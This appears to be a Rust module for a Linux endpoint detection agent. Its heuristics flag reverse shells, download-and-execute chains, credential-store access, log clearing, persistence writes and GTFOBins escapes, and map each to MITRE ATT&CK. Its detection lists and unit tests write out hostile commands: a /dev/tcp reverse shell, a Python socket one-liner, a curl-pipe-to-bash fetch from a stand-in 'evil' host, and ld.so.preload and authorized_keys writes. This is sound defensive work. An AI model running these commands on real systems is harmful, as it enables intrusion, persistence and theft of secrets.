//! Behavioural, signature-free heuristics over process command lines.
//!
//! These are pure functions: they take the observed process fields and return
//! an optional [`DetectionData`].  Keeping them pure makes them trivially
//! unit-testable and lets the future Windows agent reuse the exact same logic
//! (only the field extraction in the collector differs per OS).
//!
//! Each heuristic is mapped to a MITRE ATT&CK technique so findings are
//! immediately actionable in the backend.

use crate::schema::DetectionData;

/// Shells that, when seen spawning a network downloader, indicate a likely
/// download-and-execute chain.
const SHELLS: &[&str] = &["sh", "bash", "dash", "zsh", "ksh", "ash", "fish"];

/// Network download / exfil utilities frequently abused as LOLBins.
const DOWNLOADERS: &[&str] = &["curl", "wget", "ftp", "tftp", "nc", "ncat", "socat"];

/// Interpreters that, with an inline one-liner, are a common reverse-shell or
/// fileless-execution vector.
const INTERPRETERS: &[&str] = &["python", "python3", "perl", "ruby", "php", "lua"];

/// Inspect a process execution for suspicious command-line behaviour.
///
/// `comm` is the short process name, `exe` the resolved binary path, `cmdline`
/// the full argument string (space-joined).  Returns at most one detection
/// (the highest-signal one) to avoid alert storms on a single exec.
pub fn inspect_process(comm: &str, exe: &str, cmdline: &str) -> Option<DetectionData> {
    let lower = cmdline.to_ascii_lowercase();
    let base = basename(comm);

    // 1. Reverse shell: a shell with stdin/stdout redirected to a TCP socket.
    //    Classic patterns: `bash -i >& /dev/tcp/host/port 0>&1`
    if lower.contains("/dev/tcp/") || lower.contains("/dev/udp/") {
        return Some(DetectionData {
            rule_id: "revshell.dev_tcp_redirect".into(),
            title: "Reverse shell via /dev/tcp redirection".into(),
            category: "reverse_shell".into(),
            mitre_tactic: Some("TA0011 Command and Control".into()),
            mitre_technique: Some("T1059.004".into()),
            confidence: 90,
            subject: exe.to_string(),
            detail: format!("Process {base} references a raw network socket pseudo-device: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
        });
    }

    // 2. Interpreter one-liner opening a socket (python/perl/ruby reverse shell).
    if INTERPRETERS.iter().any(|&i| base == i || base.starts_with(i)) {
        let socket_hint = lower.contains("socket")
            && (lower.contains("connect") || lower.contains("sh") || lower.contains("subprocess") || lower.contains("os.dup"));
        let inline = lower.contains("-c ") || lower.contains("-e ");
        if socket_hint && inline {
            return Some(DetectionData {
                rule_id: "revshell.interpreter_socket".into(),
                title: "Interpreter inline socket execution".into(),
                category: "reverse_shell".into(),
                mitre_tactic: Some("TA0011 Command and Control".into()),
                mitre_technique: Some("T1059.006".into()),
                confidence: 80,
                subject: exe.to_string(),
                detail: format!("{base} executes an inline script opening a network socket: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline }),
            });
        }
    }

    // 3. Shell invoking a downloader and piping straight into a shell
    //    (`curl http://x | bash`, `wget -O- … | sh`).
    if SHELLS.contains(&base) {
        let has_downloader = DOWNLOADERS.iter().any(|&d| lower.contains(d));
        let pipes_to_shell = lower.contains("| sh") || lower.contains("|sh")
            || lower.contains("| bash") || lower.contains("|bash")
            || lower.contains("curl") && lower.contains("eval");
        if has_downloader && pipes_to_shell {
            return Some(DetectionData {
                rule_id: "lolbin.download_pipe_shell".into(),
                title: "Download piped directly into a shell".into(),
                category: "lolbin".into(),
                mitre_tactic: Some("TA0002 Execution".into()),
                mitre_technique: Some("T1059.004".into()),
                confidence: 75,
                subject: exe.to_string(),
                detail: format!("Shell {base} downloads and executes in one step: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline }),
            });
        }
    }

    // 4. Fileless execution via memfd / /proc/self/fd.
    if lower.contains("memfd:") || lower.contains("/proc/self/fd/") {
        return Some(DetectionData {
            rule_id: "fileless.memfd_exec".into(),
            title: "Execution from in-memory file descriptor".into(),
            category: "fileless".into(),
            mitre_tactic: Some("TA0005 Defense Evasion".into()),
            mitre_technique: Some("T1620".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("Process {base} executes from a memory-backed fd: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
        });
    }

    // 5. Credential access: reading the shadow password file via a shell tool.
    if (lower.contains("/etc/shadow") || lower.contains("/etc/gshadow"))
        && (base == "cat" || base == "cp" || base == "less" || base == "head"
            || base == "tail" || base == "dd" || base == "xxd" || base == "strings")
    {
        return Some(DetectionData {
            rule_id: "creds.shadow_read".into(),
            title: "Shadow password file accessed by a shell tool".into(),
            category: "credential_access".into(),
            mitre_tactic: Some("TA0006 Credential Access".into()),
            mitre_technique: Some("T1003.008".into()),
            confidence: 65,
            subject: exe.to_string(),
            detail: format!("{base} reads the shadow file: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
        });
    }

    // 6. Credential theft: access to cloud / SSH / browser credential stores.
    const CRED_STORES: &[(&str, &str)] = &[
        (".aws/credentials", "AWS credentials"),
        (".kube/config", "Kubernetes config"),
        (".docker/config.json", "Docker registry credentials"),
        (".ssh/id_rsa", "SSH private key"),
        (".ssh/id_ed25519", "SSH private key"),
        (".gnupg/", "GnuPG keyring"),
        (".netrc", "netrc credentials"),
    ];
    if base == "cat" || base == "cp" || base == "scp" || base == "tar"
        || base == "rsync" || base == "less" || base == "base64" || base == "curl"
    {
        if let Some((_, label)) = CRED_STORES.iter().find(|(p, _)| lower.contains(p)) {
            return Some(DetectionData {
                rule_id: "creds.secret_store_access".into(),
                title: format!("Access to {label}"),
                category: "credential_access".into(),
                mitre_tactic: Some("TA0006 Credential Access".into()),
                mitre_technique: Some("T1552.001".into()),
                confidence: 60,
                subject: exe.to_string(),
                detail: format!("{base} touches {label}: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "store": label }),
            });
        }
    }

    // 7. Defense evasion: clearing shell history or system logs.
    let clears_history = (lower.contains("history") && (lower.contains("-c") || lower.contains("/dev/null")))
        || lower.contains(".bash_history")
        || lower.contains("/var/log/") && (base == "rm" || base == "shred" || base == "truncate");
    if clears_history {
        return Some(DetectionData {
            rule_id: "evasion.log_or_history_clear".into(),
            title: "Shell history or system log tampering".into(),
            category: "defense_evasion".into(),
            mitre_tactic: Some("TA0005 Defense Evasion".into()),
            mitre_technique: Some("T1070".into()),
            confidence: 60,
            subject: exe.to_string(),
            detail: format!("{base} clears history/logs: {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline }),
        });
    }

    // 8. Persistence: writing to cron, systemd units, or shell rc files.
    const PERSIST_PATHS: &[&str] = &[
        "/etc/cron", "/var/spool/cron", "/etc/systemd/system",
        "/etc/init.d/", "/etc/rc.local", "/etc/profile.d/",
        ".bashrc", ".bash_profile", ".profile", "authorized_keys",
        "/etc/ld.so.preload",
    ];
    let writes = base == "tee" || base == "cp" || base == "mv" || base == "install"
        || lower.contains(">>") || lower.contains("crontab");
    if writes {
        if let Some(p) = PERSIST_PATHS.iter().find(|p| lower.contains(*p)) {
            let is_preload = *p == "/etc/ld.so.preload";
            return Some(DetectionData {
                rule_id: if is_preload { "persistence.ld_preload".into() } else { "persistence.autostart_write".into() },
                title: "Write to an autostart / persistence location".into(),
                category: "persistence".into(),
                mitre_tactic: Some("TA0003 Persistence".into()),
                mitre_technique: Some(if is_preload { "T1574.006".into() } else { "T1053".into() }),
                confidence: if is_preload { 75 } else { 60 },
                subject: exe.to_string(),
                detail: format!("{base} writes to persistence path {p}: {cmdline}"),
                evidence: serde_json::json!({ "cmdline": cmdline, "path": p }),
            });
        }
    }

    // 9. Privilege escalation: known GTFOBins-style abuse of trusted binaries.
    //    e.g. `find . -exec /bin/sh \;`, `nmap --interactive`, `vim -c :!sh`.
    let pe = match base {
        "find" if lower.contains("-exec") && (lower.contains("/sh") || lower.contains("/bash") || lower.contains("bash") || lower.contains(" sh ")) =>
            Some("find -exec shell"),
        "nmap" if lower.contains("--interactive") => Some("nmap --interactive escape"),
        "vim" | "vi" | "view" if lower.contains(":!") || lower.contains("-c") && lower.contains("sh") =>
            Some("editor shell escape"),
        "awk" | "gawk" if lower.contains("system(") || lower.contains("\"/bin/sh\"") =>
            Some("awk system() escape"),
        "tar" if lower.contains("--checkpoint-action") => Some("tar checkpoint-action escape"),
        "env" if lower.contains("/bin/sh") || lower.contains("/bin/bash") => Some("env shell spawn"),
        _ => None,
    };
    if let Some(technique) = pe {
        return Some(DetectionData {
            rule_id: "privesc.gtfobin".into(),
            title: "Trusted binary abused to spawn a shell".into(),
            category: "privilege_escalation".into(),
            mitre_tactic: Some("TA0004 Privilege Escalation".into()),
            mitre_technique: Some("T1548".into()),
            confidence: 70,
            subject: exe.to_string(),
            detail: format!("{base}: {technique} — {cmdline}"),
            evidence: serde_json::json!({ "cmdline": cmdline, "technique": technique }),
        });
    }

    None
}

/// Alert when a process was launched with LD_PRELOAD set (shared-library injection).
pub fn inspect_ld_preload(comm: &str, exe: &str, ld_preload: &str) -> Option<DetectionData> {
    Some(DetectionData {
        rule_id:         "injection.ld_preload".into(),
        title:           "LD_PRELOAD set — shared library injection".into(),
        category:        "defense_evasion".into(),
        mitre_tactic:    Some("TA0005 Defense Evasion".into()),
        mitre_technique: Some("T1574.006".into()),
        confidence:      85,
        subject:         exe.to_string(),
        detail:          format!("{comm} launched with {ld_preload}"),
        evidence:        serde_json::json!({ "ld_preload": ld_preload, "comm": comm }),
    })
}

/// Return the final path component (works for both `/usr/bin/bash` and `bash`).
fn basename(s: &str) -> &str {
    s.rsplit('/').next().unwrap_or(s)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_dev_tcp_reverse_shell() {
        let d = inspect_process("bash", "/usr/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1").unwrap();
        assert_eq!(d.category, "reverse_shell");
        assert_eq!(d.mitre_technique.as_deref(), Some("T1059.004"));
    }

    #[test]
    fn detects_python_socket_oneliner() {
        let cmd = "python3 -c import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',9001))";
        let d = inspect_process("python3", "/usr/bin/python3", cmd).unwrap();
        assert_eq!(d.category, "reverse_shell");
    }

    #[test]
    fn detects_curl_pipe_bash() {
        let d = inspect_process("bash", "/usr/bin/bash", "bash -c curl http://evil/x.sh | bash").unwrap();
        assert_eq!(d.category, "lolbin");
    }

    #[test]
    fn detects_shadow_read() {
        let d = inspect_process("cat", "/usr/bin/cat", "cat /etc/shadow").unwrap();
        assert_eq!(d.category, "credential_access");
    }

    #[test]
    fn detects_memfd_exec() {
        let d = inspect_process("evil", "memfd:payload", "memfd:payload (deleted)").unwrap();
        assert_eq!(d.category, "fileless");
    }

    #[test]
    fn detects_aws_credential_access() {
        let d = inspect_process("cat", "/usr/bin/cat", "cat /home/u/.aws/credentials").unwrap();
        assert_eq!(d.category, "credential_access");
        assert_eq!(d.rule_id, "creds.secret_store_access");
    }

    #[test]
    fn detects_history_clear() {
        let d = inspect_process("history", "/usr/bin/history", "history -c").unwrap();
        assert_eq!(d.category, "defense_evasion");
    }

    #[test]
    fn detects_authorized_keys_persistence() {
        let d = inspect_process("tee", "/usr/bin/tee", "tee -a /root/.ssh/authorized_keys").unwrap();
        assert_eq!(d.category, "persistence");
    }

    #[test]
    fn detects_ld_preload_persistence() {
        let d = inspect_process("cp", "/usr/bin/cp", "cp evil.so /etc/ld.so.preload").unwrap();
        assert_eq!(d.rule_id, "persistence.ld_preload");
    }

    #[test]
    fn detects_gtfobin_find() {
        let d = inspect_process("find", "/usr/bin/find", "find . -exec /bin/sh \\; -quit").unwrap();
        assert_eq!(d.category, "privilege_escalation");
    }

    #[test]
    fn ignores_benign_commands() {
        assert!(inspect_process("ls", "/usr/bin/ls", "ls -la /home").is_none());
        assert!(inspect_process("bash", "/usr/bin/bash", "bash -c echo hello").is_none());
        assert!(inspect_process("curl", "/usr/bin/curl", "curl https://example.com -o page.html").is_none());
        assert!(inspect_process("find", "/usr/bin/find", "find . -name '*.rs'").is_none());
        assert!(inspect_process("cat", "/usr/bin/cat", "cat README.md").is_none());
    }

    #[test]
    fn detects_ld_preload_injection() {
        let d = inspect_ld_preload("ls", "/usr/bin/ls", "LD_PRELOAD=/evil.so").unwrap();
        assert_eq!(d.rule_id, "injection.ld_preload");
        assert_eq!(d.category, "defense_evasion");
        assert_eq!(d.mitre_technique.as_deref(), Some("T1574.006"));
    }
}
